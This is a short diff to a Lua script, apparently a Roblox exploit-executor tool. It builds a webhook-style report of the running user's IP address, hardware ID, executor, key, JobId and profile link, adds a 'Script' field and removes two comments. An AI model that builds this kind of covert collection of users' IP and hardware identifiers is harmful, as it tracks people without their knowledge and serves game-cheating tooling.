@@ -27,9 +27,10 @@ local j = {
                     inline = false
                 },
                 {name = "Internet Protocol", value = string.format("```%s```", tostring(g)), inline = true},
-                {name = "Executor", value = "```" .. (identifyexecutor() or "Unknown") .. "```", inline = true}, -- Bổ sung xử lý lỗi
+                {name = "Executor", value = "```" .. (identifyexecutor() or "Unknown") .. "```", inline = true}, 
                 {name = "Key", value = "```" .. script_key .. "```", inline = true},
-                {name = "Hardware ID", value = string.format("```" .. (gethwid() or "Unknown") .. "```"), inline = false}, -- Bổ sung xử lý lỗi
+                {name = "Script", value = "```" .. _G.Script .. "```", inline = true},
+                {name = "Hardware ID", value = string.format("```" .. (gethwid() or "Unknown") .. "```"), inline = false},
                 {name = "JobId", value = string.format("```%s```", i), inline = false},
                 {
                     name = "Profile Link",
